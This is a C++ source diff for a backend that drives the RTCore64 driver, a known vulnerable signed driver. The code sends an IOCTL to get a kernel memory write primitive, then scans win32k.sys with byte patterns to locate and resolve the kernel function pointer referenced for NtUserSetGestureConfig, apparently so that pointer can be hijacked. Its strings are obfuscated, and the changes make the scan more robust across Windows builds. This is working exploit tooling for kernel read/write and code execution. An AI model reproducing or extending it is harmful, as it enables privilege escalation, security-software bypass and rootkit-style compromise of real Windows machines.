@@ -235,36 +235,65 @@ bool RTCore64Backend::WritePrimitive( uint64_t address, uint32_t size, uint32_t 
 	return DeviceIoControl( m_Device, 0x8000204C, &operation, sizeof( operation ), &operation, sizeof( operation ), nullptr, nullptr ) != FALSE;
 }
 
+#define HIGHEST_USER_ADDRESS 0x00007fffffffffff
+
+static bool IsValidKernelAddress( uint64_t pAddress )
+{
+	if ( !pAddress )
+		return false;
+
+	if ( pAddress < HIGHEST_USER_ADDRESS )
+		return false;
+
+	return *reinterpret_cast<USHORT*>( reinterpret_cast<std::uintptr_t>( &pAddress ) + 6 ) == 0xFFFF;
+}
+
 uint64_t RTCore64Backend::ResolveNtUserSetGestureConfigRef( )
 {
-	const auto exportOffset = GetKernelExportOffset( pstrw( L"win32kfull.sys" ), pstra( "NtUserSetGestureConfig" ) );
+	const uint64_t exportOffset = GetKernelExportOffset( pstrw( L"win32kfull.sys" ), pstra( "NtUserSetGestureConfig" ) );
 
 	LOG_SEC( "[*] - [RTCore64] NtUserSetGestureConfig export offset 0x%llx", exportOffset );
 
 	if ( !exportOffset )
 		return 0;
 
-	const auto win32k = GetKernelModuleAddressByName( pstra( "win32k.sys" ) );
-	const auto win32kfull = GetKernelModuleAddressByName( pstra( "win32kfull.sys" ) );
+	const uint64_t win32k = GetKernelModuleAddressByName( pstra( "win32k.sys" ) );
+	const uint64_t win32kfull = GetKernelModuleAddressByName( pstra( "win32kfull.sys" ) );
 
 	LOG_SEC( "[*] - [RTCore64] win32k=0x%llx win32kfull=0x%llx", win32k, win32kfull );
 
 	if ( !win32k || !win32kfull )
 		return 0;
 
-	uint64_t foundPointers[ 256 ] {};
+	if ( GetBuildNumber( ) >= 22631 )// Above 23H2
+	{
+		LOG_SEC( "[-] - [RTCore64] NtUserSetGestureConfig_ref not found by win32k ref scan, trying SessionState path" );
+		return ResolveNtUserSetGestureConfigRefFromSessionState( win32k, win32kfull + exportOffset );
+	}
+
+	uint64_t* pFoundPointers = reinterpret_cast<uint64_t*>( VirtualAlloc( nullptr, sizeof( uint64_t ) * 3000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );
+
+	if ( !pFoundPointers )
+	{
+		LOG_SEC( "[-] - [RTCore64] Failed to allocate memory for found pointers" );
+		return 0;
+	}
+
 	size_t foundCount = 0;
 
 	// 48 8B 05 ?? ?? ?? ?? 48 85 C0
 	if ( FindPatternInSectionAll( pstra( ".text" ), win32k, 
 		"\x48\x8B\x05\x00\x00\x00\x00\x48\x85\xC0", pstra( "xxx????xxx" ), 
-		foundPointers, _countof( foundPointers ), &foundCount ) )
+		pFoundPointers, 3000, &foundCount ) )
 	{
 		for ( size_t i = 0; i < foundCount; ++i )
 		{
-			const auto pointerAddress = ResolveRelativeAddress( foundPointers[ i ], 3, 7 );
+			if ( !IsValidKernelAddress( pFoundPointers[ i ] ) )
+				continue;
 
-			if ( !pointerAddress )
+			uint64_t pointerAddress = ResolveRelativeAddress( pFoundPointers[ i ], 3, 7 );
+
+			if ( !IsValidKernelAddress( pointerAddress ) )
 				continue;
 
 			uint64_t functionAddress = 0;
@@ -272,19 +301,21 @@ uint64_t RTCore64Backend::ResolveNtUserSetGestureConfigRef( )
 			if ( !ReadMemory( pointerAddress, &functionAddress, sizeof( functionAddress ) ) )
 				continue;
 
-			const auto currentOffset = functionAddress - win32kfull;
+			const uint64_t currentOffset = functionAddress - win32kfull;
 
 			LOG_SEC( "[!] - [RTCore64] pointerAddress=0x%llX, currentOffset=0x%llX, exportOffset=0x%llX", pointerAddress, currentOffset, exportOffset );
 			if ( currentOffset != exportOffset )
 				continue;
 
 			LOG_SEC( "[+] - [RTCore64] NtUserSetGestureConfig_ref found by win32k ref scan 0x%llX", pointerAddress );
+
+			VirtualFree( pFoundPointers, 0, MEM_RELEASE );
 			return pointerAddress;
 		}
 	}
 
-	LOG_SEC( "[-] - [RTCore64] NtUserSetGestureConfig_ref not found by win32k ref scan, trying SessionState path" );
-	return ResolveNtUserSetGestureConfigRefFromSessionState( win32k, win32kfull + exportOffset );
+	VirtualFree( pFoundPointers, 0, MEM_RELEASE );
+	return 0;	
 }
 
 uint64_t RTCore64Backend::ResolveNtUserSetGestureConfigRefFromSessionState( uint64_t win32k, uint64_t ntUserSetGestureConfigFull )
